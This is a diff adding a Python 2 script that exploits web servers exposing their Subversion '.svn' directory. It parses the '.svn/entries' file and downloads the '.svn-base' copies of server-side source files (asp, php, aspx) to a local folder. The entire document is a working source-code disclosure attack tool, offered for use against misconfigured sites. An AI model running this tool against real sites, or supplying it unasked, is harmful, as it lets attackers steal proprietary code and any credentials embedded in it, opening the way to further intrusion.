@@ -1,0 +1,59 @@
+#!/usr/bin/python
+import requests
+import sys
+import os
+import codecs
+from optparse import OptionParser
+parser = OptionParser(usage="usage:%prog <Options>")
+parser.add_option("-u","--url",dest="url",help="[Required]the .svn/entries url")
+parser.add_option("-e","--extention",dest="ext",help="[Required]the extention of the source code to be saved (e.g. asp,php,aspx)")
+parser.add_option("-d","--dest",dest="dest",help="[Required]the destination directory where the source code should be saved")
+(options,args) = parser.parse_args()
+if not options.url:
+   print "[-] URL is required";
+   sys.exit();
+if not options.ext:
+   print "[-] EXT is required";
+   sys.exit();
+if not options.dest:
+   print "[-] DEST is required";
+   sys.exit();
+try:
+   if options.dest != None and not os.path.isdir(options.dest):
+      print "[-] DEST doesn't exist"
+except Exception:
+   print "[-] Invalid DEST value"
+#check if the url is correct
+if not options.url.endswith(".svn/entries"):
+   print "[-] URL does not contain .svn/entries"
+   sys.exit()
+try:
+   response = requests.head(options.url)
+   if response.status_code != 200:
+      print "[-] Inaccessible URL (HTTP Error :"+str(response.status_code)+")"
+      sys.exit()
+except Exception as e:
+   print "[-] "+e.message
+   sys.exit()
+print "[+] Connected to "+options.url;
+entries = requests.get(options.url).text
+for line in entries.splitlines():
+   if line.endswith("."+options.ext):
+      codeURL = options.url[:-7]+"text-base/"+line+".svn-base"
+      response = requests.head(codeURL);
+      if response.status_code == 200:
+         print "[+] "+line+" exists";
+         path = ""
+         if options.dest != None:
+            path += options.dest+"/"
+         path+=line
+         code = requests.get(codeURL).text;
+         f = codecs.open(path,"wb",encoding="utf-8");
+         f.write(code)
+         f.close();
+         if options.dest != None:
+            print "[+] file saved in "+path
+         else:
+            print "[+] file saved in "+os.path.dirname(os.path.realpath(__file__))+"/"+path
+      else:
+         print "[-] "+line+" does not exists";
